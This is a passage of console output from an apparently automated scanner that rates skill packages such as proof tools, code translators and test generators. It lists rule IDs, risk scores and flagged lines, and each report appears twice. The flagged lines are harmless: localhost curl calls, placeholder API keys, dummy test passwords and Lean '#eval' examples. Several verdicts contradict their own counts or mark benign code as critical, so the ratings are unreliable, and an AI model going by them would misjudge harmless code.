    Pattern: Event: Password_Reset_Link_Expiration
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 8
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 8

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/nl-to-constraints.json
Scanning: program-correctness-prover

[*] Scanning Skill: program-correctness-prover

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/program-correctness-prover.html
Scanning: program-correctness-prover

[*] Scanning Skill: program-correctness-prover

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/program-correctness-prover.json
Scanning: program-to-model-extractor

[*] Scanning Skill: program-to-model-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/program-to-model-extractor.html
Scanning: program-to-model-extractor

[*] Scanning Skill: program-to-model-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/program-to-model-extractor.json
Scanning: proof-carrying-code-generator

[*] Scanning Skill: proof-carrying-code-generator

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (1):
  [INJ001] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM
  [OBF001] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM
  [OBF002] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-carrying-code-generator.html
Scanning: proof-carrying-code-generator

[*] Scanning Skill: proof-carrying-code-generator

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (1):
  [INJ001] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM
  [OBF001] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM
  [OBF002] in proof-carrying-code-generator/references/safety_properties.md:200
    Pattern: "eval (Add e1 e2) = (case (eval e1, eval e2) of
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-carrying-code-generator.json
Scanning: proof-failure-explainer

[*] Scanning Skill: proof-failure-explainer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-failure-explainer.html
Scanning: proof-failure-explainer

[*] Scanning Skill: proof-failure-explainer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-failure-explainer.json
Scanning: proof-refactoring-assistant

[*] Scanning Skill: proof-refactoring-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-refactoring-assistant.html
Scanning: proof-refactoring-assistant

[*] Scanning Skill: proof-refactoring-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-refactoring-assistant.json
Scanning: proof-skeleton-generator

[*] Scanning Skill: proof-skeleton-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-skeleton-generator.html
Scanning: proof-skeleton-generator

[*] Scanning Skill: proof-skeleton-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-skeleton-generator.json
Scanning: proof-trace-summarizer

[*] Scanning Skill: proof-trace-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-trace-summarizer.html
Scanning: proof-trace-summarizer

[*] Scanning Skill: proof-trace-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/proof-trace-summarizer.json
Scanning: pseudocode-extractor

[*] Scanning Skill: pseudocode-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/pseudocode-extractor.html
Scanning: pseudocode-extractor

[*] Scanning Skill: pseudocode-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/pseudocode-extractor.json
Scanning: pseudocode-to-java-code

[*] Scanning Skill: pseudocode-to-java-code

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/pseudocode-to-java-code.html
Scanning: pseudocode-to-java-code

[*] Scanning Skill: pseudocode-to-java-code

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/pseudocode-to-java-code.json
Scanning: pseudocode-to-python-code

[*] Scanning Skill: pseudocode-to-python-code

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/pseudocode-to-python-code.html
Scanning: pseudocode-to-python-code

[*] Scanning Skill: pseudocode-to-python-code

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/pseudocode-to-python-code.json
Scanning: python-api-consistency-validator

[*] Scanning Skill: python-api-consistency-validator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-api-consistency-validator.html
Scanning: python-api-consistency-validator

[*] Scanning Skill: python-api-consistency-validator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-api-consistency-validator.json
Scanning: python-regression-test-generator

[*] Scanning Skill: python-regression-test-generator

[OK] Risk Level: SAFE (1.5/10)

[!] CRITICAL Issues (4):
  [NET001] in python-regression-test-generator/SKILL.md:357
    Pattern: response = requests.get(f'https://api.example.com/users/{user_id}')
    Confidence: LOW
  [NET001] in python-regression-test-generator/references/test_generation_patterns.md:754
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  [FILE001] in python-regression-test-generator/references/test_generation_patterns.md:493
    Pattern: user = User(username='alice', password='secret123')
    Confidence: MEDIUM
  [FILE001] in python-regression-test-generator/references/test_generation_patterns.md:497
    Pattern: result = login(username='alice', password='secret123')
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 4
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-regression-test-generator.html
Scanning: python-regression-test-generator

[*] Scanning Skill: python-regression-test-generator

[OK] Risk Level: SAFE (1.5/10)

[!] CRITICAL Issues (4):
  [NET001] in python-regression-test-generator/SKILL.md:357
    Pattern: response = requests.get(f'https://api.example.com/users/{user_id}')
    Confidence: LOW
  [NET001] in python-regression-test-generator/references/test_generation_patterns.md:754
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  [FILE001] in python-regression-test-generator/references/test_generation_patterns.md:493
    Pattern: user = User(username='alice', password='secret123')
    Confidence: MEDIUM
  [FILE001] in python-regression-test-generator/references/test_generation_patterns.md:497
    Pattern: result = login(username='alice', password='secret123')
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 4
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-regression-test-generator.json
Scanning: python-repo-quickstart

[*] Scanning Skill: python-repo-quickstart

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-repo-quickstart.html
Scanning: python-repo-quickstart

[*] Scanning Skill: python-repo-quickstart

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-repo-quickstart.json
Scanning: python-test-updater

[*] Scanning Skill: python-test-updater

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (25):
  [NET001] in python-test-updater/SKILL.md:373
    Pattern: def fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:377
    Pattern: async def fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:384
    Pattern: def test_fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:385
    Pattern: result = fetch()
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:390
    Pattern: async def test_fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:391
    Pattern: result = await fetch()
    Confidence: MEDIUM
  [NET001] in python-test-updater/references/test-update-patterns.md:336
    Pattern: return requests.get(url).json()
    Confidence: MEDIUM
  [FILE001] in python-test-updater/references/test-update-patterns.md:167
    Pattern: def validate_password(password):
    Confidence: MEDIUM
  [FILE001] in python-test-updater/references/test-update-patterns.md:168
    Pattern: return len(password) >= 6
    Confidence: MEDIUM
  [FILE001] in python-test-updater/references/test-update-patterns.md:173
    Pattern: def validate_password(password):
    Confidence: MEDIUM
  and 15 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 25
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 25

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/python-test-updater.html
Scanning: python-test-updater

[*] Scanning Skill: python-test-updater

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (25):
  [NET001] in python-test-updater/SKILL.md:373
    Pattern: def fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:377
    Pattern: async def fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:384
    Pattern: def test_fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:385
    Pattern: result = fetch()
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:390
    Pattern: async def test_fetch():
    Confidence: MEDIUM
  [NET001] in python-test-updater/SKILL.md:391
    Pattern: result = await fetch()
    Confidence: MEDIUM
  [NET001] in python-test-updater/references/test-update-patterns.md:336
    Pattern: return requests.get(url).json()
    Confidence: MEDIUM
  [FILE001] in python-test-updater/references/test-update-patterns.md:167
    Pattern: def validate_password(password):
    Confidence: MEDIUM
  [FILE001] in python-test-updater/references/test-update-patterns.md:168
    Pattern: return len(password) >= 6
    Confidence: MEDIUM
  [FILE001] in python-test-updater/references/test-update-patterns.md:173
    Pattern: def validate_password(password):
    Confidence: MEDIUM
  and 15 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 25
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 25

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/python-test-updater.json
Scanning: python-to-dafny-translator

[*] Scanning Skill: python-to-dafny-translator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-to-dafny-translator.html
Scanning: python-to-dafny-translator

[*] Scanning Skill: python-to-dafny-translator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/python-to-dafny-translator.json
Scanning: python-to-lean4-translator

[*] Scanning Skill: python-to-lean4-translator

[?] Risk Level: LOW (2.6/10)

[!] CRITICAL Issues (3):
  [INJ001] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [INJ001] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [INJ001] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM

[*] WARNING Issues (9):
  [INJ002] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [INJ002] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [INJ002] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM
  [OBF001] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [OBF001] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [OBF001] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM
  [OBF002] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [OBF002] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [OBF002] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 9
  Info Issues: 0
  Total Issues: 12

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/python-to-lean4-translator.html
Scanning: python-to-lean4-translator

[*] Scanning Skill: python-to-lean4-translator

[?] Risk Level: LOW (2.6/10)

[!] CRITICAL Issues (3):
  [INJ001] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [INJ001] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [INJ001] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM

[*] WARNING Issues (9):
  [INJ002] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [INJ002] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [INJ002] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM
  [OBF001] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [OBF001] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [OBF001] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM
  [OBF002] in python-to-lean4-translator/references/advanced_features.md:107
    Pattern: #eval (· + 1) <$> some 5  -- some 6
    Confidence: MEDIUM
  [OBF002] in python-to-lean4-translator/references/advanced_features.md:108
    Pattern: #eval (· + 1) <$> [1, 2, 3]  -- [2, 3, 4]
    Confidence: MEDIUM
  [OBF002] in python-to-lean4-translator/references/advanced_features.md:252
    Pattern: #eval (nats.take 10)  -- [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 9
  Info Issues: 0
  Total Issues: 12

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/python-to-lean4-translator.json
Scanning: readme-generator

[*] Scanning Skill: readme-generator

[?] Risk Level: LOW (3.1/10)

[!] CRITICAL Issues (8):
  [NET001] in readme-generator/SKILL.md:190
    Pattern: curl -X POST http://localhost:3000/api/resources \
    Confidence: MEDIUM
  [NET001] in readme-generator/SKILL.md:197
    Pattern: curl http://localhost:3000/api/resources
    Confidence: MEDIUM
  [NET001] in readme-generator/SKILL.md:229
    Pattern: results = client.batch_fetch([
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:134
    Pattern: #   API_KEY=your_api_key_here
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:211
    Pattern: client = Client(api_key="your_key")
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:223
    Pattern: api_key="your_key",
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:324
    Pattern: | `API_KEY` | External API key | - | Yes |
    Confidence: MEDIUM
  [CMD001] in readme-generator/SKILL.md:84
    Pattern: - Install on Ubuntu: `sudo apt-get install [packages]`
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 8
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 8

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/readme-generator.html
Scanning: readme-generator

[*] Scanning Skill: readme-generator

[?] Risk Level: LOW (3.1/10)

[!] CRITICAL Issues (8):
  [NET001] in readme-generator/SKILL.md:190
    Pattern: curl -X POST http://localhost:3000/api/resources \
    Confidence: MEDIUM
  [NET001] in readme-generator/SKILL.md:197
    Pattern: curl http://localhost:3000/api/resources
    Confidence: MEDIUM
  [NET001] in readme-generator/SKILL.md:229
    Pattern: results = client.batch_fetch([
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:134
    Pattern: #   API_KEY=your_api_key_here
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:211
    Pattern: client = Client(api_key="your_key")
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:223
    Pattern: api_key="your_key",
    Confidence: MEDIUM
  [FILE001] in readme-generator/SKILL.md:324
    Pattern: | `API_KEY` | External API key | - | Yes |
    Confidence: MEDIUM
  [CMD001] in readme-generator/SKILL.md:84
    Pattern: - Install on Ubuntu: `sudo apt-get install [packages]`
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 8
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 8

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/readme-generator.json
Scanning: refinement-step-generator

[*] Scanning Skill: refinement-step-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/refinement-step-generator.html
Scanning: refinement-step-generator

[*] Scanning Skill: refinement-step-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/refinement-step-generator.json
Scanning: regression-consistency-checker

[*] Scanning Skill: regression-consistency-checker

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in regression-consistency-checker/references/detection_strategies.md:281
    Pattern: return old.keys() == new.keys() and all(
    Confidence: MEDIUM
  [FILE001] in regression-consistency-checker/references/detection_strategies.md:282
    Pattern: semantic_match(old[k], new[k]) for k in old.keys()
    Confidence: MEDIUM
  [FILE001] in regression-consistency-checker/scripts/compare_results.py:35
    Pattern: all_tests = set(old_results.keys()) | set(new_results.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/regression-consistency-checker.html
Scanning: regression-consistency-checker

[*] Scanning Skill: regression-consistency-checker

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in regression-consistency-checker/references/detection_strategies.md:281
    Pattern: return old.keys() == new.keys() and all(
    Confidence: MEDIUM
  [FILE001] in regression-consistency-checker/references/detection_strategies.md:282
    Pattern: semantic_match(old[k], new[k]) for k in old.keys()
    Confidence: MEDIUM
  [FILE001] in regression-consistency-checker/scripts/compare_results.py:35
    Pattern: all_tests = set(old_results.keys()) | set(new_results.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/regression-consistency-checker.json
Scanning: regression-root-cause-analyzer

[*] Scanning Skill: regression-root-cause-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/regression-root-cause-analyzer.html
Scanning: regression-root-cause-analyzer

[*] Scanning Skill: regression-root-cause-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/regression-root-cause-analyzer.json
Scanning: release-notes-writer

[*] Scanning Skill: release-notes-writer

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in release-notes-writer/SKILL.md:264
    Pattern: client = APIClient(session_token="abc123")
    Confidence: MEDIUM
  [FILE001] in release-notes-writer/SKILL.md:269
    Pattern: client = APIClient(api_key="sk-abc123")
    Confidence: MEDIUM
  [FILE001] in release-notes-writer/SKILL.md:272
    Pattern: **Migration:** Update your initialization code to use the new `api_key` param...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/release-notes-writer.html
Scanning: release-notes-writer

[*] Scanning Skill: release-notes-writer

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in release-notes-writer/SKILL.md:264
    Pattern: client = APIClient(session_token="abc123")
    Confidence: MEDIUM
  [FILE001] in release-notes-writer/SKILL.md:269
    Pattern: client = APIClient(api_key="sk-abc123")
    Confidence: MEDIUM
  [FILE001] in release-notes-writer/SKILL.md:272
    Pattern: **Migration:** Update your initialization code to use the new `api_key` param...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/release-notes-writer.json
Scanning: replay-oriented-instrumentation

[*] Scanning Skill: replay-oriented-instrumentation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/replay-oriented-instrumentation.html
Scanning: replay-oriented-instrumentation

[*] Scanning Skill: replay-oriented-instrumentation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/replay-oriented-instrumentation.json
Scanning: reproduction-trace-instrumenter

[*] Scanning Skill: reproduction-trace-instrumenter

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/reproduction-trace-instrumenter.html
Scanning: reproduction-trace-instrumenter

[*] Scanning Skill: reproduction-trace-instrumenter

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/reproduction-trace-instrumenter.json
Scanning: req-to-test

[*] Scanning Skill: req-to-test

[!] Risk Level: CRITICAL (9.4/10)

[!] CRITICAL Issues (21):
  [FILE001] in req-to-test/SKILL.md:84
    Pattern: And I enter password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:93
    Pattern: And I enter password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:131
    Pattern: - password = "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:132
    Pattern: Execute: user = create_user(email, password)
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:135
    Pattern: - user.password is hashed
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:156
    Pattern: 3. Verify response contains user ID and token
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:162
    Pattern: - Response body contains: {id: <uuid>, token: <jwt>}
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:164
    Pattern: - User password is hashed (not plain text)
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:166
    Pattern: - Confirmation link in email contains valid token
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:189
    Pattern: And user enters password "SecurePass123"
    Confidence: MEDIUM
  and 11 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 21
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 21

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/req-to-test.html
Scanning: req-to-test

[*] Scanning Skill: req-to-test

[!] Risk Level: CRITICAL (9.4/10)
